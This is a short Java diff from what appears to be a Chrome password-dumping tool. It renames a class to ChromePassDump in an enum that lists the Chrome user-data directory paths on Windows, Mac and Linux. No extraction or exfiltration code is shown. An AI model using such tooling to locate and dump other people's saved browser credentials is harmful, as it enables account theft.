@@ -2,17 +2,17 @@ package me.matt.chrome.acc.util;
 
 import java.io.File;
 
-import me.matt.chrome.acc.Application;
+import me.matt.chrome.acc.ChromePassDump;
 
 public enum OperatingSystem {
 
 	WINDOWS(System.getProperty("user.home") + File.separator + "AppData\\Local\\Google\\Chrome\\User Data\\",
-			Application.class.getProtectionDomain().getCodeSource().getLocation().toString().replace("%20", " ").replace("file:/", "").replace("/",
+			ChromePassDump.class.getProtectionDomain().getCodeSource().getLocation().toString().replace("%20", " ").replace("file:/", "").replace("/",
 					File.separator)),
 	MAC(System.getProperty("user.home") + File.separator + "Library/Application Support/Google/Chrome/",
-			Application.class.getProtectionDomain().getCodeSource().getLocation().toString().replace("%20", " ").replace("file:", "").replace("/",
+			ChromePassDump.class.getProtectionDomain().getCodeSource().getLocation().toString().replace("%20", " ").replace("file:", "").replace("/",
 					File.separator)),
-	LINUX(System.getProperty("user.home") + File.separator + ".config/google-chrome/", Application.class.getProtectionDomain().getCodeSource()
+	LINUX(System.getProperty("user.home") + File.separator + ".config/google-chrome/", ChromePassDump.class.getProtectionDomain().getCodeSource()
 			.getLocation().toString().replace("%20", " ").replace("file:", "").replace("/", File.separator)),
 	UNKNOWN("", "");
 
